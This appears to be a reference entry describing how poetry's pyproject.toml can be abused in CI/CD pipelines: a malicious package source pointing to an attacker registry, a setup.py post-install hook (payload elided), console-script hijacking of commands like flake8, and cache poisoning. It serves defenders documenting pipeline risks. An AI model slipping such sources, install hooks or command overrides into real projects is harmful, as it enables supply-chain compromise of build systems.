---
title: poetry
tags:
- cli
- input-file
- eval-py
references:
- https://python-poetry.org/docs/repositories/
- https://python-poetry.org/docs/configuration/
files: [pyproject.toml, setup.py]
---
# poetry 
`poetry` is a modern tool for Python dependency management and packaging. It uses the `pyproject.toml` file as its central configuration.

## pyproject.toml

When a workflow executes `poetry install`, it resolves and installs dependencies based on the contents of `pyproject.toml` and the `poetry.lock` file. An attacker who can modify `pyproject.toml` can control where packages are downloaded from and what code is executed.

# Source Manipulation (Index URL)

An attacker can modify `pyproject.toml` to add a new package source that points to a malicious, attacker-controlled registry. This is done using the [[tool.poetry.source]] table.

```toml
# 'pyproject.toml' file
[[tool.poetry.source]]
url = "https://super_attacker_controlled_registry"
name = "super_registry"
```

# Malicious post-install script with setup.py

`pyproject.toml` can be configured to install a dependency from a local directory. An attacker can set the path key to point to a malicious package within the repository, which will be installed when `poetry install` is run. 

When poetry install installs a dependency (either from a malicious repository or a local path), it will execute the `setup.py` of that dependency if it is built with `setuptools`.

An attacker can craft a malicious dependency with a `setup.py` file defining a malicious post-install script. This code is executed automatically and immediately during the `poetry install` process, leading to arbitrary python code execution.

```py
# setup.py
from setuptools import setup
from setuptools.command.install import install

class CustomInstallCommand(install):
    """Customized setuptools install command."""
    def run(self):
        # Run the standard install
        install.run(self)
        
        # After installation, run the malicious post-install script
        ...

setup(
    name='poesie',
    version='0.1.0',
    py_modules=['poesie'],
    cmdclass={
        'install': CustomInstallCommand,
    },
)
```


# Command Hijacking

`poetry` can define console scripts in `pyproject.toml` using the [tool.poetry.scripts] or the standard [project.scripts] section. When `poetry install` is run, these scripts are created inside the virtual environment's bin directory.

An attacker can use this to overwrite a legitimate poetry command that might be used later in the workflow. This command will be executed when `poetry run <cmd>` is run. 

```toml
[project.scripts]
flake8 = "super_nice_func.ever:very_pretty"
```

In this example, `poetry run flake8` will execute the malicious python script defined in `super_nice_func/ever.py`. 

# Cache Poisoning

The attacks described present a significant threat in CI/CD environments that share a dependency cache between workflows. Poetry maintains its own cache of downloaded packages.

If a vulnerable workflow (e.g., one with a malicious source in `pyproject.toml`) runs, it populates the shared cache with poisoned packages from the attacker's registry. Subsequent, non-vulnerable workflows that share this cache may retrieve the malicious package from the cache instead of downloading it from the legitimate PyPI, thereby compromising those workflows as well.